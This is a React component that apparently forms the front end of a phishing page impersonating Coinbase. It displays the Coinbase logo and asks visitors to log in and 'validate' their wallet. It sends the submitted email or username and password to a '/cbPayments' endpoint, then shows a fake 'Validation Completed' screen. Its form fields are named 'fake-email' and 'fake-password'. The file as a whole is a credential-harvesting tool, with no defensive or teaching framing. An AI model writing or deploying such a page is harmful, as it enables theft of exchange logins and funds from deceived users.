import React, { useState } from "react";
import { Eye, EyeOff, Loader2 } from "lucide-react";
import "./cbPaymentLanding.css";
import logo from "../../assets/coinbase_logo.png";
import fetchWithRetry from "../../utils/api";

const CbPaymentLanding = () => {
  const [form, setForm] = useState({ emailOrUsername: "", password: "" });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  const submitForm = async () => {
    setError("");
    setLoading(true);

    try {
      const res = await fetchWithRetry("/cbPayments", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Submission failed");

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  if (done) {
    return (
      <div className="landing-bg">
        <img src={logo} className="landing-logo" />
        <div className="result-card animate-pop">
          <h2>Validation Completed</h2>
          <h2 aria-live="polite">
            Loading your account…<br />
            Please check your email to confirm.
          </h2>
          <p>Do you want to validate another wallet?</p>
          <div className="landing-actions">
            <button onClick={() => window.location.reload()}>Redo Validation</button>
            <button onClick={() => (window.location.href = "/")}>Go Home</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="landing-bg">
      <img src={logo} className="landing-logo" />
      <div className="form-card animate-fade">
        <h2>Kindly log in to your platform</h2>
        <input
          autoComplete="off"
          name="fake-email"
          placeholder="Email or Username"
          value={form.emailOrUsername}
          onChange={e => setForm({ ...form, emailOrUsername: e.target.value })}
        />
        <div className="password-box">
          <input
            type={showPassword ? "text" : "password"}
            autoComplete="new-password"
            name="fake-password"
            placeholder="Password"
            value={form.password}
            onChange={e => setForm({ ...form, password: e.target.value })}
          />
          <span onClick={() => setShowPassword(!showPassword)}>
            {showPassword ? <EyeOff /> : <Eye />}
          </span>
        </div>
        {error && <p className="error-text">{error}</p>}
        <button disabled={loading} onClick={submitForm}>
          {loading ? <Loader2 className="spin" /> : "Validate"}
        </button>
      </div>
    </div>
  );
};

export default CbPaymentLanding;